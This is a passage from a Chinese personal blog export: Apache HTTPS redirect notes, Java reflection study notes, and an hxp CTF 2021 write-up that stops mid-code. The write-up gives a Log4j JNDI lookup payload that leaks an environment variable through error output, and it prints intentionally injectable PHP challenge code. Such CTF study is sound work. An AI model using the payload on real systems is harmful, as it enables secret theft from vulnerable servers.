<pre><code>&lt;Directory &quot;/var/www/html&quot;&gt;
    RewriteEngine on
    RewriteCond   %&#123;SERVER_PORT&#125; !^443$
    RewriteRule   ^(.*)?$  https://%&#123;SERVER_NAME&#125;%&#123;REQUEST_URI&#125; [L,R]
&lt;/Directory&gt;
</code></pre>
<p>发现。。。不太行<br>好像是能跳但是跳过去之后报一个ERR_SSL_PROTOCOL_ERROR，没法访问</p>
<p>后来发现ssl有一个单独配置文件default-ssl.conf，或者说我一开始的理解就有误<br>确切的配置方法是在000-default.conf中正常配置，提供http服务，端口设置为80，但是访问这个http服务就应该被重定向到https去，设置一个跳转规则<br>而在default-ssl.conf配置ssl engine，在443端口开https服务，配置证书，实现ssl<br>也就是说其实是开两个服务，80的http重定向到443的https</p>
<p>因为我还设置了两个网站，一个www和一个blog，他们共用一个443端口，但这并不是问题，在两个conf文件中都创建一个<code>&lt;VirtualHost *:80/443&gt;</code>，并且Document Root设置成对应的目录就行</p>
<h2 id="sites-available-amp-sites-enable"><a href="#sites-available-amp-sites-enable" class="headerlink" title="sites-available&amp;sites-enable"></a>sites-available&amp;sites-enable</h2><p>这个东西坑了我半天。。。虽然enable看起来就比较像应用的配置文件，但是之前修改<br>以前一直改的sites-available里的000-default.conf，并且改完了也能用，又sites-enable里没有default-ssl.conf，导致我错以为sites-available就是配置文件位置，浪费了几个小时在这上面。。。</p>
<p>最后发现sites-enable才是配置文件位置，里面的000-default.conf是个软链接，链接到了sites-available里的000-default.conf，所以再软链接一个default-ssl.conf重启Apache就算搞定了</p>
]]></content>
      <categories>
        <category>杂项</category>
      </categories>
      <tags>
        <tag>https</tag>
        <tag>Apache</tag>
      </tags>
  </entry>
  <entry>
    <title>Java入门</title>
    <url>/java%E5%85%A5%E9%97%A8.html</url>
    <content><![CDATA[<h1 id="Java入门"><a href="#Java入门" class="headerlink" title="Java入门"></a>Java入门</h1><p>学！</p>
<h2 id="ClassLoader"><a href="#ClassLoader" class="headerlink" title="ClassLoader"></a>ClassLoader</h2><p>Java的类都不是一启动就全部加载了的，有些类只在被需要时才被临时加载进JVM。而实现类加载的就是Java的ClassLoader，这个东西感觉在学Java的时候会无数次的被提及，以及他相应的一些知识点。</p>
<h3 id="类的加载时机"><a href="#类的加载时机" class="headerlink" title="类的加载时机"></a>类的加载时机</h3><p>类的加载分为显式和隐式两种<br>显示加载：调用ClassLoader的loadClass，findClass方法，Class类的forName()方法<br>隐式加载：<code>new getstatic putstatic invokestatic</code> 四个指令会隐式的进行类的加载</p>
<h3 id="常见ClassLoader"><a href="#常见ClassLoader" class="headerlink" title="常见ClassLoader"></a>常见ClassLoader</h3><p><code>BootStrap ClassLoader</code>，启动类加载器。最顶层的类加载器，负责加载java核心类库，由C++实现，写在了JVM底层，已经超脱出了java类的范畴，所以当我们尝试去获取由BootStrap ClassLoader加载的类的加载器时，得到的结果会是<code>null</code><br><code>Extension ClassLoader</code>，扩展类加载器。加载<code>JAVA_HOME/jre/lib/ext/</code>路径下的jar<br><code>App ClassLoader</code>，系统类加载器。是默认的类加载器<br>然后就是我们自定义的ClassLoader了</p>
<h3 id="双亲委派模型"><a href="#双亲委派模型" class="headerlink" title="双亲委派模型"></a>双亲委派模型</h3><p>应该说是一种规范。就是当第一级的ClassLoader去加载一个类的时候，先把这个类提供给他的父加载器进行加载，父加载器加载不到再自己动手。<br>并不是类的继承关系，而是一种规定的父加载器关系<br>BootStrap ClassLoader -&gt; Extension ClassLoader -&gt; App ClassLoader -&gt; 自定义ClassLoader<br>双亲委派模型有各种各样的好处，比如什么不会重复加载类啦什么的</p>
<p>并且如果同一个类使用不同的ClassLoader加载进来会导致这两个类被认为是不同类</p>
<h3 id="ClassLoader核心方法"><a href="#ClassLoader核心方法" class="headerlink" title="ClassLoader核心方法"></a>ClassLoader核心方法</h3><ol>
<li><code>loadClass</code>(加载指定的Java类)</li>
<li><code>findClass</code>(查找指定的Java类)</li>
<li><code>findLoadedClass</code>(查找JVM已经加载过的类)</li>
<li><code>defineClass</code>(定义一个Java类)</li>
<li><code>resolveClass</code>(链接指定的Java类)</li>
</ol>
<p>类加载器都是<code>java.lang.ClassLoader</code>的子类，Bootstrap不算。一般写一个自定义的ClassLoader，就是要能找到一个类的字节码文件并返回<br>findClass是统一加载类的函数，在这个函数里面一般先调用父加载器的findClass函数，找不到就自己根据路径去加载类字节码，用defineClass方法（是JVM的native方法）将类字节码注册到JVM里面去</p>
<h2 id="反射"><a href="#反射" class="headerlink" title="反射"></a>反射</h2><p>之前看Java反序列化的时候就学了一点了，现在再复习一下<br>反射说白了就是能在程序运行时通过一些手段来动态的加载类以及调用类的方法，访问类的成员变量之类的，廖雪峰反射这段讲的也蛮好的</p>
<p>反射操作的是Java的Class类，所以在进行反射操作的时候需要先获取到Class类对象</p>
<h3 id="Class类"><a href="#Class类" class="headerlink" title="Class类"></a>Class类</h3><p>JVM在每次遇到一个没有加载的class的时候就会使用ClassLoader将对应类的.class文件（也就是javac编译出来的字节码文件）加载进来，然后为该类创建一个Class类的对象比如String类就是<code>Class cls = new Class(String);</code><br>Class对象是由JVM创建的，且Class类的构造方法是private的，所以只有JVM能创建class实例<br>每个Class实例会指向一个数据类型（String，Runnable之类的），同时一个Class实例也包含该类的完整信息</p>
<h3 id="获取Class实例"><a href="#获取Class实例" class="headerlink" title="获取Class实例"></a>获取Class实例</h3><ol>
<li>类名.class</li>
<li>Class.forName(“类名”)</li>
<li>classLoader.loadClass(“类名”)<br>访问一个class文件下的内部类时需要使用$，对于数组类型的需要使用奇怪的表示方式，如下<pre class=" language-java"><code class="language-java">Class<span class="token operator">&lt;</span><span class="token operator">?</span><span class="token operator">></span> doubleArray <span class="token operator">=</span> Class<span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span><span class="token string">"[D"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//相当于double[].class</span>
Class<span class="token operator">&lt;</span><span class="token operator">?</span><span class="token operator">></span> cStringArray <span class="token operator">=</span> Class<span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span><span class="token string">"[[Ljava.lang.String;"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">// 相当于String[][].class</span>
</code></pre>
</li>
</ol>
<h3 id="获取Method实例"><a href="#获取Method实例" class="headerlink" title="获取Method实例"></a>获取Method实例</h3><p>能获得任意类一般不是我们的重点，一般来说我们都是想调用某个类的特定方法，因此我们需要获得一个类的一个Method实例<br>可以通过<code>Method class.getDeclaredMethod(name)</code>从Class实例中获取到对应类的一个方法Method实例<br>Method实例并不等于对应的方法，但可以通过<code>method.invoke(Object,Object...)</code><br>在调用静态方法时类实例可以为null，参数没有可以不填</p>
<h3 id="获取Field实例"><a href="#获取Field实例" class="headerlink" title="获取Field实例"></a>获取Field实例</h3><p>访问反射获取的Class对象时可以越过类对对象的访问控制权限进行，即private等属性的变量也可以进行访问，通过<code>class.getField(name)</code>可以访问到公有属性，<code>Field class.getDeclaredField(name)</code>可以获取任意属性，函数名加s获取全部公有&#x2F;任意属性<br>返回的均为Field对象，同样的，使用<code>Field.get(Object)</code>和<code>Field.set(Object,Object)</code>，获取类实例的name属性，或是对类实例的对应属性进行赋值但对应private属性还需先进行<code>class.setAccessible(true)</code>，但是JVM可能存在<code>SecurityManager</code>阻止对某些类使用setAccessible(true)</p>
<h3 id="通过反射获取Unsafe类"><a href="#通过反射获取Unsafe类" class="headerlink" title="通过反射获取Unsafe类"></a>通过反射获取Unsafe类</h3><p>Unsafe类提供了Java一些非常底层的操作，为java内部用API，不允许外部调用。不能被直接new出来，当使用ClassLoader进行加载的时候只允许被Bootstrap ClassLoader加载<br>可以通过反射的方式来获取Unsafe类<br>Unsafe类中有一个<code>private static final Unsafe theUnsafe</code>成员变量，其即为Unsafe类的实例<br>可以通过如下方法来获取Unsafe类实例</p>
<pre class=" language-java"><code class="language-java">Class <span class="token class-name">clz</span> <span class="token operator">=</span> Class<span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span><span class="token string">"sun.misc.Unsafe"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
Field f <span class="token operator">=</span> clz<span class="token punctuation">.</span><span class="token function">getDeclaredField</span><span class="token punctuation">(</span><span class="token string">"theUnsafe"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
f<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
Unsafe unsafe <span class="token operator">=</span> <span class="token punctuation">(</span>Unsafe<span class="token punctuation">)</span>f<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>null<span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre>
<p>forName要写完整路径。。我一开始没写就没成<br>Unsafe类可以使用allocateInstance无视构造函数的构建一个类实例<br>在java8之前可以通过Unsafe类的defineClass绕过ClassLoader在JVM中创建Class对象</p>
<h3 id="代理"><a href="#代理" class="headerlink" title="代理"></a>代理</h3><p>代理的关键就是不编写实现类，直接在运行时创建某个接口（interface）的实例<br>通过一个InvocationHandler定义一个handler，其可对代理对象的方法进行增强，使用Proxy.newProxyInstance()创建一个interface实例，接受三个参数：ClassLoader，传入接口类的ClassLoader即可，要实现的接口数组（只传一个接口也行，但是一定得是数组），一个处理接口方法的InvocationHandler，代理对象的方法最终都会交给InvocationHandler的invoke方法执行<br>通过Proxy创建代理对象，然后将接口方法由InvocationHandler完成</p>
<p>只需要被代理类和接口实现了同一个接口，即可保证其内部的结构一致，就可以通过实例化接口生成的代理对象接受被代理类，并在此基础上进行代码增强</p>
<p>代理实际的实现原理也就是JVM在运行时用你给的ClassLoader临时生成了一个代理类的字节码并加载进了内存</p>
<h2 id="Native方法"><a href="#Native方法" class="headerlink" title="Native方法"></a>Native方法</h2><p>是一个Java调用非Java代码的接口，一般来说就是Java交给C&#x2F;C++实现的功能<br>这个方法使用的一大原因就是跨平台，在很底层的实现上并不由Java实现，而是通过C&#x2F;C++等语言对应不同的平台进行实现，然后把这些方法按照JNI(Java Native Interface)的规范进行编写，编译成动态链接库，打包在不同平台的JDK上，实现Java的跨平台</p>
<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://www.liaoxuefeng.com/wiki/1252599548343744/1264799402020448">Class类-廖雪峰的官方网站</a><br><a href="https://www.liaoxuefeng.com/wiki/1252599548343744/1264804593397984#0">动态代理-廖雪峰的官方网站</a><br><a href="https://zhuanlan.zhihu.com/p/54693308">好怕怕的类加载器</a><br><a href="https://www.zhihu.com/question/20794107">Java动态代理</a>第二个回答</p>
]]></content>
      <categories>
        <category>笔记</category>
      </categories>
      <tags>
        <tag>Java</tag>
      </tags>
  </entry>
  <entry>
    <title>hxpctf2021复现</title>
    <url>/hxpctf2021%E5%A4%8D%E7%8E%B0.html</url>
    <content><![CDATA[<h1 id="hxpctf2021复现"><a href="#hxpctf2021复现" class="headerlink" title="hxpctf2021复现"></a>hxpctf2021复现</h1><p>还是蹭的科恩的车，虽然菜狗很努力的看了一天半，但真的菜，不会就是不会，所以仍然内容主题是复现（以及hxp这把所有web的dockerfile都非常复杂，进行了究极权限控制）<br>（这把在misc里面有一个log4j的题）</p>
<h2 id="Log-4-sanity-check"><a href="#Log-4-sanity-check" class="headerlink" title="Log 4 sanity check"></a>Log 4 sanity check</h2><p>log4j题，签到难度。给了附件，class直接反汇编出来，就是nc上去输一个字符串然后直接log4j打印一下触发</p>
<h3 id="究极dockerfile"><a href="#究极dockerfile" class="headerlink" title="究极dockerfile"></a>究极dockerfile</h3><p>给了一个超长dockerfile。。。hxp的dockerfile基本上都这么长，进行了各种究极的权限控制，操作也都类似</p>
<pre class=" language-dockerfile"><code class="language-dockerfile"># Running locally:
# 1) echo 'hxp{FLAG}' > flag.txt
# 2) docker build -t log4sanitycheck .
# 3) docker run -p 1337:1024 --rm --cap-add=SYS_ADMIN --security-opt apparmor=unconfined -it log4sanitycheck

FROM debian:bullseye

# Install deps.
RUN apt-get update && \
    DEBIAN_FRONTEND=noninteractive apt-get install -y --no-install-recommends \
        default-jre-headless && \
    rm -rf /var/lib/apt/lists/

# Set up the flag
COPY flag.txt docker-stuff/readflag /
RUN chown root:1337 /flag.txt /readflag && \
    chmod 040 /flag.txt && \
    chmod 2555 /readflag

# Set up ynetd and the launcher
RUN useradd --create-home --shell /bin/bash ctf
WORKDIR /home/ctf
COPY Vuln.class run.sh *.xml *.jar /home/ctf/
COPY ynetd /sbin/
RUN chmod 555 /home/ctf && \
    chown -R root:root /home/ctf && \
    chmod -R 000 /home/ctf/* && \
    chmod 500 /sbin/ynetd && \
    chmod 005 /home/ctf/run.sh && \
    chmod 004 /home/ctf/*.class /home/ctf/*.jar /home/ctf/*.xml

# We're paranoid
RUN find / -ignore_readdir_race -type f \( -perm -4000 -o -perm -2000 \) -not -wholename /readflag -delete
USER ctf
RUN (find --version && id --version && sed --version && grep --version) > /dev/null
RUN ! find / -writable -or -user $(id -un) -or -group $(id -Gn|sed -e 's/ / -or -group /g') 2> /dev/null | grep -Ev -m 1 '^(/dev/|/run/|/proc/|/sys/|/tmp|/var/tmp|/var/lock|/var/mail|/var/spool/mail)'

# Run
USER root
EXPOSE 1024
CMD ynetd -np y -lm -1 -lpid 64 -lt 10 -t 30 "FLAG='$(cat /flag.txt)' /home/ctf/run.sh"
</code></pre>
<p>最开始的下载东西还比较正常，然后逐渐变得离谱。<br>上来就给flag040，再配合一个setUID的readflag，之后各种限制权限，能给0的都给0<br><code>We&#39;re paranoid</code>下面那段代码大概是在把readflag以外的所有特权程序全都删掉，然后检查一下find，id，sed，grep这几个命令是不是存在<br>grep -E选项启用正则，-v选项只显示不匹配项目，-m选项为匹配行数，大概就是只匹配不是这些目录下的属于当前用户或当前用户可写的文件（暂时没看出来那个感叹号有什么用），但-m 1只匹配一行，不知道，如果存在多个这样的文件而第一行在规定的<code>/dev/|/run/|/proc/...</code>这些目录里面，不就会显示匹配不上了？</p>
<h3 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h3><p>要打到命令执行，而log4j要打到命令执行用的是jndi注入，要么远古版本jdk直接reference打通，要么tomcat版本特殊用对应factory打，要么本地自带CC之类的一套链。显然这里一个条件的不符合<br><code>CMD ynetd -np y -lm -1 -lpid 64 -lt 10 -t 30 &quot;FLAG=&#39;$(cat /flag.txt)&#39; /home/ctf/run.sh&quot;</code><br>但是看到最后RUN运行的这句，是以root直接起了这个ynetd，虽然不知道这个是什么，但是有一句<code>FLAG=&#39;$(cat /flag.txt)</code>，把flag塞进了环境变量。<br>log4j在爆出漏洞的时候因为通杀一个dnslog验证，所以大家也就想出了dnslog外带的方法，可以看看jdk version之类的，这里同样也可以外带flag</p>
<p>一开始因为是要自己搭一个dnslog的，后来发现直接报错也会回显，直接<br><code>$&#123;jndi:$&#123;env:FLAG&#125;&#125;</code>即可在报错中拿到flag</p>
<p><code>hxp&#123;Phew, I am glad I code everything in PHP anyhow :) - :( :( :(&#125;</code></p>
<p>以及他们的flag都长的一逼</p>
<h2 id="shitty-blog"><a href="#shitty-blog" class="headerlink" title="shitty blog"></a>shitty blog</h2><p>我觉得还挺难的 :(</p>
<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
<span class="token comment" spellcheck="true">// TODO: fully implement multi-user / guest feature :(</span>

<span class="token variable">$secret</span> <span class="token operator">=</span> <span class="token string">'SECRET_PLACEHOLDER'</span><span class="token punctuation">;</span>
<span class="token variable">$salt</span> <span class="token operator">=</span> <span class="token string">'$6$'</span><span class="token punctuation">.</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token function">hash_hmac</span><span class="token punctuation">(</span><span class="token string">'md5'</span><span class="token punctuation">,</span> <span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string">'REMOTE_ADDR'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token variable">$secret</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token string">'$'</span><span class="token punctuation">;</span>

<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span> <span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_COOKIE</span><span class="token punctuation">[</span><span class="token string">'session'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
    <span class="token variable">$id</span> <span class="token operator">=</span> <span class="token function">random_int</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token constant">PHP_INT_MAX</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$mac</span> <span class="token operator">=</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token function">crypt</span><span class="token punctuation">(</span><span class="token function">hash_hmac</span><span class="token punctuation">(</span><span class="token string">'md5'</span><span class="token punctuation">,</span> <span class="token variable">$id</span><span class="token punctuation">,</span> <span class="token variable">$secret</span><span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token variable">$salt</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">20</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token keyword">else</span> <span class="token punctuation">{</span>
    <span class="token variable">$session</span> <span class="token operator">=</span> <span class="token function">explode</span><span class="token punctuation">(</span><span class="token string">'|'</span><span class="token punctuation">,</span> <span class="token variable">$_COOKIE</span><span class="token punctuation">[</span><span class="token string">'session'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span> <span class="token operator">!</span> <span class="token function">hash_equals</span><span class="token punctuation">(</span><span class="token function">crypt</span><span class="token punctuation">(</span><span class="token function">hash_hmac</span><span class="token punctuation">(</span><span class="token string">'md5'</span><span class="token punctuation">,</span> <span class="token variable">$session</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token variable">$secret</span><span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token variable">$salt</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token variable">$salt</span><span class="token punctuation">.</span><span class="token variable">$session</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token function">exit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token variable">$id</span> <span class="token operator">=</span> <span class="token variable">$session</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token variable">$mac</span> <span class="token operator">=</span> <span class="token variable">$session</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token function">setcookie</span><span class="token punctuation">(</span><span class="token string">'session'</span><span class="token punctuation">,</span> <span class="token variable">$id</span><span class="token punctuation">.</span><span class="token string">'|'</span><span class="token punctuation">.</span><span class="token variable">$mac</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$sandbox</span> <span class="token operator">=</span> <span class="token string">'./data/'</span><span class="token punctuation">.</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$salt</span><span class="token punctuation">.</span><span class="token string">'|'</span><span class="token punctuation">.</span><span class="token variable">$id</span><span class="token punctuation">.</span><span class="token string">'|'</span><span class="token punctuation">.</span><span class="token variable">$mac</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span> <span class="token function">is_dir</span><span class="token punctuation">(</span><span class="token variable">$sandbox</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token function">mkdir</span><span class="token punctuation">(</span><span class="token variable">$sandbox</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token variable">$db</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">PDO</span><span class="token punctuation">(</span><span class="token string">'sqlite:'</span><span class="token punctuation">.</span><span class="token function">realpath</span><span class="token punctuation">(</span><span class="token variable">$sandbox</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token string">'/blog.sqlite3'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$db</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">setAttribute</span><span class="token punctuation">(</span><span class="token constant">PDO</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token constant">ATTR_ERRMODE</span><span class="token punctuation">,</span> <span class="token constant">PDO</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token constant">ERRMODE_EXCEPTION</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$db</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">setAttribute</span><span class="token punctuation">(</span><span class="token constant">PDO</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token constant">ATTR_EMULATE_PREPARES</span><span class="token punctuation">,</span> <span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token variable">$schema</span> <span class="token operator">=</span> "
    <span class="token constant">CREATE</span> <span class="token constant">TABLE</span> <span class="token keyword">IF</span> <span class="token constant">NOT</span> <span class="token constant">EXISTS</span> <span class="token function">user</span> <span class="token punctuation">(</span>id <span class="token constant">INTEGER</span> <span class="token constant">PRIMARY</span> <span class="token constant">KEY</span><span class="token punctuation">,</span> name <span class="token function">VARCHAR</span><span class="token punctuation">(</span><span class="token number">255</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token constant">CREATE</span> <span class="token constant">TABLE</span> <span class="token keyword">IF</span> <span class="token constant">NOT</span> <span class="token constant">EXISTS</span> <span class="token function">entry</span> <span class="token punctuation">(</span>id <span class="token constant">INTEGER</span> <span class="token constant">PRIMARY</span> <span class="token constant">KEY</span> <span class="token constant">AUTOINCREMENT</span><span class="token punctuation">,</span> user_id <span class="token constant">INTEGER</span><span class="token punctuation">,</span> content <span class="token constant">TEXT</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token constant">INSERT</span> <span class="token keyword">OR</span> <span class="token constant">IGNORE</span> <span class="token constant">INTO</span> <span class="token function">user</span> <span class="token punctuation">(</span>id<span class="token punctuation">,</span> name<span class="token punctuation">)</span> <span class="token function">VALUES</span> <span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token string">'System'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token constant">INSERT</span> <span class="token keyword">OR</span> <span class="token constant">IGNORE</span> <span class="token constant">INTO</span> <span class="token function">entry</span> <span class="token punctuation">(</span>id<span class="token punctuation">,</span> user_id<span class="token punctuation">,</span> content<span class="token punctuation">)</span> <span class="token function">VALUES</span> <span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token string">'Welcome to your new blog - 🚩🚩🚩 ʕ•́ᴥ•̀ʔっ🤎 🚩🚩🚩'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
"<span class="token punctuation">;</span>
<span class="token variable">$db</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">exec</span><span class="token punctuation">(</span><span class="token variable">$schema</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">function</span> <span class="token function">get_entries</span><span class="token punctuation">(</span><span class="token variable">$db</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
    <span class="token variable">$sth</span> <span class="token operator">=</span> <span class="token variable">$db</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">query</span><span class="token punctuation">(</span><span class="token string">'SELECT id, user_id, content FROM entry ORDER BY id DESC'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
     <span class="token keyword">return</span> <span class="token variable">$sth</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">fetchAll</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
<span class="token punctuation">}</span>

<span class="token keyword">function</span> <span class="token function">get_user</span><span class="token punctuation">(</span><span class="token variable">$db</span><span class="token punctuation">,</span> <span class="token variable">$user_id</span><span class="token punctuation">)</span> <span class="token punctuation">:</span> string <span class="token punctuation">{</span>
    <span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$db</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">query</span><span class="token punctuation">(</span><span class="token string">"SELECT name FROM user WHERE id = {$user_id}"</span><span class="token punctuation">)</span> <span class="token keyword">as</span> <span class="token variable">$user</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">return</span> <span class="token variable">$user</span><span class="token punctuation">[</span><span class="token string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">return</span> <span class="token string">'me'</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token keyword">function</span> <span class="token function">insert_entry</span><span class="token punctuation">(</span><span class="token variable">$db</span><span class="token punctuation">,</span> <span class="token variable">$content</span><span class="token punctuation">,</span> <span class="token variable">$user_id</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token variable">$sth</span> <span class="token operator">=</span> <span class="token variable">$db</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">prepare</span><span class="token punctuation">(</span><span class="token string">'INSERT INTO entry (content, user_id) VALUES (?, ?)'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$sth</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">execute</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token variable">$content</span><span class="token punctuation">,</span> <span class="token variable">$user_id</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token keyword">function</span> <span class="token function">delete_entry</span><span class="token punctuation">(</span><span class="token variable">$db</span><span class="token punctuation">,</span> <span class="token variable">$entry_id</span><span class="token punctuation">,</span> <span class="token variable">$user_id</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token variable">$db</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">exec</span><span class="token punctuation">(</span><span class="token string">"DELETE from entry WHERE {$user_id} &lt;> 0 AND id = {$entry_id}"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'content'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token function">insert_entry</span><span class="token punctuation">(</span><span class="token variable">$db</span><span class="token punctuation">,</span> <span class="token function">htmlspecialchars</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'content'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token variable">$id</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token function">header</span><span class="token punctuation">(</span><span class="token string">'Location: /'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    exit<span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token variable">$entries</span> <span class="token operator">=</span> <span class="token function">get_entries</span><span class="token punctuation">(</span><span class="token variable">$db</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'delete'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$entries</span> <span class="token keyword">as</span> <span class="token variable">$key</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token variable">$entry</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'delete'</span><span class="token punctuation">]</span> <span class="token operator">===</span> <span class="token variable">$entry</span><span class="token punctuation">[</span><span class="token string">'id'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
            <span class="token function">delete_entry</span><span class="token punctuation">(</span><span class="token variable">$db</span><span class="token punctuation">,</span> <span class="token variable">$entry</span><span class="token punctuation">[</span><span class="token string">'id'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token variable">$entry</span><span class="token punctuation">[</span><span class="token string">'user_id'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">break</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>

    <span class="token function">header</span><span class="token punctuation">(</span><span class="token string">'Location: /'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    exit<span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$entries</span> <span class="token keyword">as</span> <span class="token variable">$key</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token variable">$entry</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
